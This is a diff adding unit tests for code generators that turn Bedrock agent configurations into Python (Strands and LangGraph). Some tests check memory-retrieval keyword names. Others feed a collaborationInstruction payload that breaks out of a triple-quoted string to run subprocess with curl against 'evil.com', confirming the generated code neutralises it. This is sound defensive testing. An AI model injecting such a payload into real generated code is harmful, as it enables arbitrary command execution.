@@ -81,6 +81,29 @@ describe('StrandsTranslator', () => {
     expect(result.features.hasMemory).toBe(true);
   });
 
+  it('emits namespace_path (not namespace) in retrieve_memories calls for longAndShortTerm memory', () => {
+    const config = makeSimpleAgentConfig({
+      agent: {
+        ...makeSimpleAgentConfig().agent,
+        memoryConfiguration: { enabledMemoryTypes: ['SESSION_SUMMARY'] },
+      },
+    });
+    const translator = new StrandsTranslator(config, {
+      agentConfig: config,
+      enableMemory: true,
+      memoryOption: 'longAndShortTerm',
+      enableObservability: false,
+    });
+    const result = translator.translate();
+
+    // All three retrieval calls should use the new namespace_path kwarg
+    expect(result.mainPyContent).toContain("namespace_path=f'/users/{user_id}/facts'");
+    expect(result.mainPyContent).toContain("namespace_path=f'/users/{user_id}/preferences'");
+    expect(result.mainPyContent).toContain("namespace_path=f'/summaries/{user_id}/'");
+    // The deprecated kwarg form must not appear for longAndShortTerm retrievals
+    expect(result.mainPyContent).not.toMatch(/retrieve_memories\([^)]*\bnamespace=/);
+  });
+
   it('generates action group tools for function-schema action groups', () => {
     const config = makeSimpleAgentConfig({
       action_groups: [
@@ -146,6 +169,88 @@ describe('StrandsTranslator', () => {
     expect(result.mainPyContent).toContain('agentcore/cdk/lib/cdk-stack.ts');
     expect(result.mainPyContent).toContain('addToPolicy');
     expect(result.mainPyContent).toContain('<YOUR_AGENT_NAME>');
+  });
+});
+
+function makeCollaboratorConfig(collaborationInstruction: string): BedrockAgentConfig {
+  const collaboratorAgentConfig = makeSimpleAgentConfig();
+  return makeSimpleAgentConfig({
+    agent: {
+      ...makeSimpleAgentConfig().agent,
+      agentCollaboration: 'SUPERVISOR_ROUTER',
+    },
+    collaborators: [
+      {
+        agent: { ...collaboratorAgentConfig.agent, agentName: 'collab-agent' },
+        action_groups: [],
+        knowledge_bases: [],
+        collaborators: [],
+        collaboratorName: 'collab',
+        collaborationInstruction,
+      },
+    ],
+  });
+}
+
+function extractToolFunction(mainPyContent: string): string {
+  const start = mainPyContent.indexOf('@tool');
+  const end = mainPyContent.indexOf('\n\n\n', start);
+  return mainPyContent.slice(start, end);
+}
+
+describe('StrandsTranslator - collaborationInstruction injection safety', () => {
+  it('neutralizes triple-quote injection in collaborationInstruction', () => {
+    const payload = '"""\nimport subprocess; subprocess.run(["curl","evil.com"])\n"""';
+    const config = makeCollaboratorConfig(payload);
+    const translator = new StrandsTranslator(config, {
+      agentConfig: config,
+      enableMemory: false,
+      memoryOption: 'none',
+      enableObservability: false,
+    });
+    const { mainPyContent } = translator.translate();
+    expect(extractToolFunction(mainPyContent)).toMatchSnapshot();
+  });
+
+  it('preserves backslashes in collaborationInstruction without doubling', () => {
+    const payload = 'C:\\path\\to\\file and regex \\d+';
+    const config = makeCollaboratorConfig(payload);
+    const translator = new StrandsTranslator(config, {
+      agentConfig: config,
+      enableMemory: false,
+      memoryOption: 'none',
+      enableObservability: false,
+    });
+    const { mainPyContent } = translator.translate();
+    expect(extractToolFunction(mainPyContent)).toMatchSnapshot();
+  });
+});
+
+describe('LangGraphTranslator - collaborationInstruction injection safety', () => {
+  it('neutralizes triple-quote injection in collaborationInstruction', () => {
+    const payload = '"""\nimport subprocess; subprocess.run(["curl","evil.com"])\n"""';
+    const config = makeCollaboratorConfig(payload);
+    const translator = new LangGraphTranslator(config, {
+      agentConfig: config,
+      enableMemory: false,
+      memoryOption: 'none',
+      enableObservability: false,
+    });
+    const { mainPyContent } = translator.translate();
+    expect(extractToolFunction(mainPyContent)).toMatchSnapshot();
+  });
+
+  it('preserves backslashes in collaborationInstruction without doubling', () => {
+    const payload = 'C:\\path\\to\\file and regex \\d+';
+    const config = makeCollaboratorConfig(payload);
+    const translator = new LangGraphTranslator(config, {
+      agentConfig: config,
+      enableMemory: false,
+      memoryOption: 'none',
+      enableObservability: false,
+    });
+    const { mainPyContent } = translator.translate();
+    expect(extractToolFunction(mainPyContent)).toMatchSnapshot();
   });
 });
 
@@ -220,6 +325,29 @@ describe('LangGraphTranslator', () => {
     expect(result.mainPyContent).toContain('guardrails');
     expect(result.mainPyContent).toContain('gr-123');
     expect(result.features.hasGuardrails).toBe(true);
+  });
+
+  it('emits namespace_path (not namespace) in retrieve_memories calls for longAndShortTerm memory', () => {
+    const config = makeSimpleAgentConfig({
+      agent: {
+        ...makeSimpleAgentConfig().agent,
+        memoryConfiguration: { enabledMemoryTypes: ['SESSION_SUMMARY'] },
+      },
+    });
+    const translator = new LangGraphTranslator(config, {
+      agentConfig: config,
+      enableMemory: true,
+      memoryOption: 'longAndShortTerm',
+      enableObservability: false,
+    });
+    const result = translator.translate();
+
+    // All three retrieval calls should use the new namespace_path kwarg
+    expect(result.mainPyContent).toContain("namespace_path=f'/users/{user_id}/facts'");
+    expect(result.mainPyContent).toContain("namespace_path=f'/users/{user_id}/preferences'");
+    expect(result.mainPyContent).toContain("namespace_path=f'/summaries/{user_id}/'");
+    // The deprecated kwarg form must not appear for longAndShortTerm retrievals
+    expect(result.mainPyContent).not.toMatch(/retrieve_memories\([^)]*\bnamespace=/);
   });
 });
 
